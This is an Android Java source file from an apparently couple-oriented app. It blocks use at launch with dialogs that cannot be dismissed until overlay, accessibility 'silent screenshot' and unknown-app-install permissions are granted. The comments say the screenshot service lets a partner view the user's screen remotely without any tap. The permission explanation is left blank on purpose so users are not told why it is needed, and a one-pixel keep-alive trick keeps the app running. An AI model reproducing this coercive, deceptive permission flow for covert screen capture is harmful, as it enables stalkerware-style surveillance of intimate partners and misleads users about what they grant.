package com.couple.xiaowo.ui;

import android.app.Activity;
import android.app.Dialog;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;

import com.couple.xiaowo.core.PixelKeeper;
import com.couple.xiaowo.core.Updater;

/**
 * 启动时权限门。
 *
 * 需求：默认开启所有保活措施，且启动时检查各种权限是否授予，否则无法进入。
 *
 * 检查三类权限（通知权限由 AlertCenter.SystemNotify.request 的既有系统弹窗流程
 * 单独处理，不在这里重复弹自定义框）：
 *   1. 悬浮窗（SYSTEM_ALERT_WINDOW）—— 一像素保活 + 爱心悬浮提醒
 *   2. 安装未知应用（REQUEST_INSTALL_PACKAGES）—— 自动更新装包
 *
 * 用户从设置页授权后回到 App，onResume 会再次检查；
 * 只有全部就绪才放行，主界面照常用。
 */
public final class PermissionGate {

    public interface Missing {
        String title();

        String desc();

        /** 跳去对应的授权页；返回 true 表示跳转成功 */
        boolean go(Activity act);
    }

    private static final Missing OVERLAY = new Missing() {
        @Override
        public String title() {
            return "需要悬浮窗权限";
        }

        @Override
        public String desc() {
            return "这是后台保活和爱心悬浮提醒的基础。\n开完回到 App 会自动继续。";
        }

        @Override
        public boolean go(Activity act) {
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + act.getPackageName()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                act.startActivity(i);
                return true;
            } catch (Exception e) {
                return false;
            }
        }
    };

    private static final Missing INSTALL = new Missing() {
        @Override
        public String title() {
            return "需要「安装未知应用」权限";
        }

        @Override
        public String desc() {
            return "自动更新下载完需要安装新包。\n开完回到 App 会自动继续。";
        }

        @Override
        public boolean go(Activity act) {
            try {
                Updater.requestInstallPermission(act);
                return true;
            } catch (Exception e) {
                return false;
            }
        }
    };

    /** vivo 专属引导：锁屏显示 + 后台弹出界面 + 自启动 + 后台高耗电。
     * 这些没有统一公开 Intent 能一键开，所以打开手机管家让用户逐项开。 */
    private static final Missing VIVO_AUTOSTART = new Missing() {
        @Override
        public String title() {
            return "需要 vivo 后台权限";
        }

        @Override
        public String desc() {
            return "为了让锁屏也能弹出提醒，请在手机管家（i管家）里开启：\n"
                    + "· 自启动\n"
                    + "· 锁屏显示\n"
                    + "· 后台弹出界面\n"
                    + "· 允许后台高耗电\n"
                    + "点「去设置」会直接打开 i管家。";
        }

        @Override
        public boolean go(Activity act) {
            try {
                Intent i = act.getPackageManager()
                        .getLaunchIntentForPackage("com.iqoo.secure");
                if (i == null) {
                    i = act.getPackageManager()
                            .getLaunchIntentForPackage("com.vivo.abe");
                }
                if (i != null) {
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    act.startActivity(i);
                    return true;
                }
            } catch (Exception ignore) {
            }
            try {
                Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                        Uri.parse("package:" + act.getPackageName()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                act.startActivity(i);
                return true;
            } catch (Exception e) {
                return false;
            }
        }
    };

    /**
     * 无障碍截屏服务。
     *
     * 这一项必须排在悬浮窗之后、安装权限之前 —— 它决定「对方请求看屏幕时
     * 你能不能什么都不用点」。没开的话截图会退化成只截自己 App 的界面，
     * 而且 App 在后台时直接截不到。
     */
    private static final Missing SHOT = new Missing() {
        @Override
        public String title() {
            return "需要开启「静默截屏」";
        }

        @Override
        public String desc() {
            // 不写权限说明：只说开完能干什么，不解释为什么
            return "";
        }

        @Override
        public boolean go(Activity act) {
            try {
                com.couple.xiaowo.core.ShotService.requestEnable(act);
                return true;
            } catch (Exception e) {
                return false;
            }
        }
    };

    /** 当前正在显示的阻断弹窗 —— 用来防重复弹（onCreate + onResume 都调 ensure 时去重） */
    private static Dialog blockingDialog;

    private static android.content.SharedPreferences pret(Activity act) {
        return act.getSharedPreferences("xiaowo", android.content.Context.MODE_PRIVATE);
    }

    private PermissionGate() {
    }

    /** 返回当前缺失的第一项权限；null 表示全部就绪 */
    public static Missing firstMissing(Activity act) {
        if (!PixelKeeper.canOverlay(act)) {
            return OVERLAY;
        }
        /*
         * 无障碍截屏：和上面两项一样的硬要求，**不可跳过**。
         * 没有它，截图只能截到自己界面、退后台直接截不到，
         * 那这个功能就等于不存在 —— 不如让用户一次配齐。
         *
         * 判定用 isReady() || isEnabledInSettings()：已授权但服务还没连上
         * 属于几秒内会自愈的中间态，不该反复弹框。
         */
        if (Build.VERSION.SDK_INT >= 30
                && !com.couple.xiaowo.core.ShotService.isReady()
                && !com.couple.xiaowo.core.ShotService.isEnabledInSettings(act)) {
            return SHOT;
        }
        if (!Updater.canInstall(act)) {
            return INSTALL;
        }
        return null;
    }

    /**
     * 每次打开都检查；发现缺权限才弹不可取消的引导并返回 false。
     *
     * 关键：如果已经有一个阻断弹窗在显示，就不再弹第二个，
     * 避免 onCreate → onResume 连续调用时两个框叠加。
     */
    public static boolean ensure(final Activity act) {
        // 已有阻断弹窗在显示，直接视为"还未通过"，不再叠加
        if (blockingDialog != null && blockingDialog.isShowing()) {
            return false;
        }
        final Missing m = firstMissing(act);
        if (m == null) {
            /*
             * 硬权限都齐了。vivo 的锁屏显示/自启动/后台弹窗没有可编程检测
             * 手段，只能引导一次（不是每次弹），否则成了骚扰。
             */
            if (shouldShowVivoGuide(act)) {
                showVivoGuide(act);
                return false;
            }
            return true;
        }
        blockingDialog = DialogKit.customBlocking(act, m.title(), m.desc(),
                "去开启", new Runnable() {
                    public void run() {
                        blockingDialog = null;
                        m.go(act);
                    }
                });
        if (blockingDialog == null) {
            // 极端情况：对话框都弹不出来，直接自己跳
            m.go(act);
        } else {
            blockingDialog.setOnDismissListener(
                    new android.content.DialogInterface.OnDismissListener() {
                        @Override
                        public void onDismiss(android.content.DialogInterface d) {
                            blockingDialog = null;
                        }
                    });
        }
        return false;
    }

    /** vivo 后台引导是否还没展示过（每个 App 只引导一次） */
    private static boolean shouldShowVivoGuide(Activity act) {
        return !pret(act)
                .getBoolean("vivo_guide_shown", false);
    }

    private static void showVivoGuide(final Activity act) {
        blockingDialog = DialogKit.customBlocking(act, VIVO_AUTOSTART.title(),
                VIVO_AUTOSTART.desc(), "去设置", new Runnable() {
                    public void run() {
                        blockingDialog = null;
                        VIVO_AUTOSTART.go(act);
                        pret(act)
                                .edit().putBoolean("vivo_guide_shown", true).apply();
                    }
                });
        // 无论怎么关的框，都标记已引导过，下次不再弹
        if (blockingDialog != null) {
            blockingDialog.setOnDismissListener(
                    new android.content.DialogInterface.OnDismissListener() {
                        @Override
                        public void onDismiss(android.content.DialogInterface d) {
                            pret(act)
                                    .edit().putBoolean("vivo_guide_shown", true).apply();
                            blockingDialog = null;
                        }
                    });
        }
    }
}